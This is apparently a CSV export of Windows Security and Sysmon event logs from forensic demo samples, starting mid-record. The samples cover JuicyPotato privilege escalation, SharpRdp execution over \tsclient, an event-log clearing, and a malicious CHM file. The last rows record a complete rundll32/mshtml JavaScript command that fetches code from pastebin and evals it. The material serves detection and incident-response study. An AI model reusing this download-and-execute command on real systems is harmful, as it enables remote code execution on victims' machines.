121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1120)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
1,25048,2019-11-15 08:19:02.2985120,1102,Info,Microsoft-Windows-Eventlog,Security,748,6064,alice.insecurebank.local,0,,Event log cleared,insecurebank\bob,,SID: (S-1-5-21-1005675359-741490361-30848483-1108),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4624_LT3_AnonymousLogon_Localhost_-_JuicyPotato.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-1005675359-741490361-30848483-1108"",""SubjectUserName"":""bob"",""SubjectDomainName"":""insecurebank"",""SubjectLogonId"":""0x1C363A4""}}}"
2,25049,2019-11-15 08:19:16.1025097,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,516,308,alice.insecurebank.local,0,,Successful logon,-\-,- (127.0.0.1),Target: NT AUTHORITY\ANONYMOUS LOGON,LogonType 3,LogonId: 0x1D12916,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4624_LT3_AnonymousLogon_Localhost_-_JuicyPotato.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-7""},{""@Name"":""TargetUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""TargetDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""TargetLogonId"",""#text"":""0x1D12916""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""NtLmSsp ""},{""@Name"":""AuthenticationPackageName"",""#text"":""NTLM""},{""@Name"":""WorkstationName"",""#text"":""-""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""NTLM V1""},{""@Name"":""KeyLength"",""#text"":""128""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""127.0.0.1""},{""@Name"":""IpPort"",""#text"":""59336""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
3,25050,2019-11-15 08:19:17.1344692,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,516,5300,alice.insecurebank.local,0,,An account was logged off,,,Target: NT AUTHORITY\ANONYMOUS LOGON,LogonType 3,LogonId: 0x1D12916,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4624_LT3_AnonymousLogon_Localhost_-_JuicyPotato.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-7""},{""@Name"":""TargetUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""TargetDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""TargetLogonId"",""#text"":""0x1D12916""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,311396,2020-07-10 10:20:34.9103347,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 3304, ProcessGUID: 747f3d96-40f2-5f08-0000-0010d8a92c00","RuleName: ","SHA1=0265C1718EC95B025D9719F3B4872826F8F4661F,MD5=9E089ECF8B86983B7A77E3844CD02BB5,SHA256=AF5CAE4B514215E530643A7FEA2D7A47A1B15F6E5610347B217D1ABFA4AE0F92,IMPHASH=E3F33CEBF67721DAC951AFBD20321206",ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 824, ParentProcessGUID: 747f3d96-1350-5f08-0000-001014c50000",ParentCommandLine: C:\Windows\System32\svchost.exe -k NetworkService -s TermService,rdpclip,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:34.877""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-40f2-5f08-0000-0010d8a92c00""},{""@Name"":""ProcessId"",""#text"":""3304""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\rdpclip.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1131 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""RDP Clipboard Monitor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""rdpclip.exe""},{""@Name"":""CommandLine"",""#text"":""rdpclip""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-94cd-5f07-0000-0020abbf0300""},{""@Name"":""LogonId"",""#text"":""0x3BFAB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=0265C1718EC95B025D9719F3B4872826F8F4661F,MD5=9E089ECF8B86983B7A77E3844CD02BB5,SHA256=AF5CAE4B514215E530643A7FEA2D7A47A1B15F6E5610347B217D1ABFA4AE0F92,IMPHASH=E3F33CEBF67721DAC951AFBD20321206""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-1350-5f08-0000-001014c50000""},{""@Name"":""ParentProcessId"",""#text"":""824""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\System32\\svchost.exe -k NetworkService -s TermService""}]}}"
2,311397,2020-07-10 10:20:35.5897222,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,3896,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 824, ProcessGUID: 747f3d96-1350-5f08-0000-001014c50000","RuleName: ",SourceHostname: LAPTOP-JU4M3I0E,SourceIp: 192.168.56.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 192.168.56.101,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 02:19:35.898""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-1350-5f08-0000-001014c50000""},{""@Name"":""ProcessId"",""#text"":""824""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK SERVICE""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.56.1""},{""@Name"":""SourceHostname"",""#text"":""LAPTOP-JU4M3I0E""},{""@Name"":""SourcePort"",""#text"":""53627""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.56.101""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""3389""},{""@Name"":""DestinationPortName"",""#text"":""ms-wbt-server""}]}}"
3,311398,2020-07-10 10:20:35.8869949,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:35.880""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
4,311399,2020-07-10 10:20:35.9131338,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:35.898""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
5,311411,2020-07-10 10:20:37.6371518,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 4236, ProcessGUID: 747f3d96-40f5-5f08-0000-001095812d00","RuleName: ","SHA1=C494051E7CBC27552D5E805A18D5EEAA01076F02,MD5=024DC9AA2127EF2A9018612F36CC66EF,SHA256=0EDC55867506DF98243526DC2C0FAFDDA40F5058D6932FAA89D179D57FEBFAB0,IMPHASH=69193DAE402063F5D8E635AA50D6F9BE",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 3248, ParentProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400",ParentCommandLine: C:\Windows\Explorer.EXE,"""\\tsclient\c\temp\stack\a.exe"" ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:37.626""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-40f5-5f08-0000-001095812d00""},{""@Name"":""ProcessId"",""#text"":""4236""},{""@Name"":""Image"",""#text"":""\\\\tsclient\\c\\temp\\stack\\a.exe""},{""@Name"":""FileVersion"",""#text"":""?""},{""@Name"":""Description"",""#text"":""?""},{""@Name"":""Product"",""#text"":""?""},{""@Name"":""Company"",""#text"":""?""},{""@Name"":""OriginalFileName"",""#text"":""?""},{""@Name"":""CommandLine"",""#text"":""\""\\\\tsclient\\c\\temp\\stack\\a.exe\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""\\\\tsclient\\c\\temp\\stack\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-94cd-5f07-0000-0020abbf0300""},{""@Name"":""LogonId"",""#text"":""0x3BFAB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=C494051E7CBC27552D5E805A18D5EEAA01076F02,MD5=024DC9AA2127EF2A9018612F36CC66EF,SHA256=0EDC55867506DF98243526DC2C0FAFDDA40F5058D6932FAA89D179D57FEBFAB0,IMPHASH=69193DAE402063F5D8E635AA50D6F9BE""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ParentProcessId"",""#text"":""3248""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
6,311412,2020-07-10 10:20:37.6724713,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:37.668""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
7,311413,2020-07-10 10:20:37.6724860,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\e,Details: \\tsclient\c\temp\stack\a.exe\1,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:37.668""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\e""},{""@Name"":""Details"",""#text"":""\\\\tsclient\\c\\temp\\stack\\a.exe\\1""}]}}"
8,311414,2020-07-10 10:20:37.6724993,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 3248, ProcessGUID: 747f3d96-94cf-5f07-0000-0010bd590400","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: edcba,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:37.668""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94cf-5f07-0000-0010bd590400""},{""@Name"":""ProcessId"",""#text"":""3248""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""edcba""}]}}"
9,311423,2020-07-10 10:20:58.9425063,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3148,4088,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 7128, ProcessGUID: 747f3d96-94dc-5f07-0000-00102fb00700","RuleName: ",Image: C:\Windows\system32\mmc.exe,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-10 10:20:58.942""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-94dc-5f07-0000-00102fb00700""},{""@Name"":""ProcessId"",""#text"":""7128""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\mmc.exe""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
1,4348,2019-07-26 07:39:14.3755654,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5924,6056,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 1504, ProcessGUID: 747f3d96-ae22-5d3a-0000-001096b24e00","RuleName: ","SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020,MD5=1CECEE8D02A8E9B19D3A1A65C7A2B249,SHA256=8AB2F9A4CA87575F03F554AEED6C5E0D7692FA9B5D420008A1521F7F7BD2D0A5,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 4940, ParentProcessGUID: 747f3d96-abd7-5d3a-0000-001012661000",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\Windows\hh.exe"" C:\Users\IEUser\Desktop\Fax Record N104F.chm",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Sysmon_Exec_CompiledHTML.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-07-26 07:39:14.345""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-ae22-5d3a-0000-001096b24e00""},{""@Name"":""ProcessId"",""#text"":""1504""},{""@Name"":""Image"",""#text"":""C:\\Windows\\hh.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Microsoft® HTML Help Executable""},{""@Name"":""Product"",""#text"":""HTML Help""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\hh.exe\"" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\Desktop\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-abd5-5d3a-0000-0020eb990f00""},{""@Name"":""LogonId"",""#text"":""0xF99EB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020,MD5=1CECEE8D02A8E9B19D3A1A65C7A2B249,SHA256=8AB2F9A4CA87575F03F554AEED6C5E0D7692FA9B5D420008A1521F7F7BD2D0A5,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-abd7-5d3a-0000-001012661000""},{""@Name"":""ParentProcessId"",""#text"":""4940""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
2,4353,2019-07-26 07:39:14.9358572,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5924,6056,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 5548, ProcessGUID: 747f3d96-ae22-5d3a-0000-001004d84e00","RuleName: ","SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",ParentProcess: C:\Windows\hh.exe,"ParentProcessID: 1504, ParentProcessGUID: 747f3d96-ae22-5d3a-0000-001096b24e00","ParentCommandLine: ""C:\Windows\hh.exe"" C:\Users\IEUser\Desktop\Fax Record N104F.chm","""C:\Windows\System32\cmd.exe"" /c copy /Y C:\Windows\system32\rundll32.exe %%TEMP%%\out.exe &gt; nul &amp;&amp; %%TEMP%%\out.exe javascript:""\..\mshtml RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WinHttp.WinHttpRequest.5.1"");h.Open(""GET"",""http://pastebin.com/raw/y2CjnRtH"",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im out.exe"",0,true);}",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Sysmon_Exec_CompiledHTML.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2019-07-26 07:39:14.853""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-ae22-5d3a-0000-001004d84e00""},{""@Name"":""ProcessId"",""#text"":""5548""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\cmd.exe\"" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe &gt; nul &amp;&amp; %%TEMP%%\\out.exe javascript:\""\\..\\mshtml RunHTMLApplication \"";document.write();h=new%%20ActiveXObject(\""WinHttp.WinHttpRequest.5.1\"");h.Open(\""GET\"",\""http://pastebin.com/raw/y2CjnRtH\"",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\""WScript.Shell\"").Run(\""cmd /c taskkill /f /im out.exe\"",0,true);}""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\Desktop\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-abd5-5d3a-0000-0020eb990f00""},{""@Name"":""LogonId"",""#text"":""0xF99EB""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-ae22-5d3a-0000-001096b24e00""},{""@Name"":""ParentProcessId"",""#text"":""1504""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\hh.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\hh.exe\"" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm""}]}}"
